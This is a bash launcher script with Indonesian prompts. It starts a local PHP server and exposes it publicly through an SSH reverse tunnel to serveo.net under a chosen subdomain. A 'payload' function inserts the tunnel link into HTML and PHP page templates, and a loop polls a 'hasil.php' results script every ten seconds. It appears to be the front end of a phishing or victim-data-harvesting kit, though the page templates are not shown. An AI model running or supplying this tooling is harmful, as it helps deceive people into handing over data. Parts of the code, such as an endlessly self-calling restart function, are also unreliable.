#!/bin/bash
checkfound() {
printf "\n\033[31;1m[\033[33;1m#\033[31;1m] \033[37;1mTekan \033[32;1mCtrl + C \033[37;1muntuk Menonaktifkan...\e[0m\n"
while [ true ]; do
sleep 10
php hasil.php
done 
}
server() {
printf '\033[31;1m[\033[33;1m#\033[31;1m] \033[37;1mMembuat Link...'
if [[ $subdomain_resp == true ]]; then
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
sleep 8
fi
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 3
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\n\033[31;1m[\033[33;1m#\033[31;1m] \033[37;1mLink :\e[0m\033[33;1m %s\n' $send_link
}
ngrok_server() {
checkfound
}
start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
start
start1
}
payload() {
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
sed 's+forwarding_link+'$send_link'+g' index.html > index2.html
sed 's+forwarding_link+'$send_link'+g' template.php > index.php
}
start() {
subdomain_resp=true
printf '\033[31;1m[\033[33;1m#\033[31;1m] \033[37;1mMasukan Nama Website : \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
server
payload
checkfound
}
start1

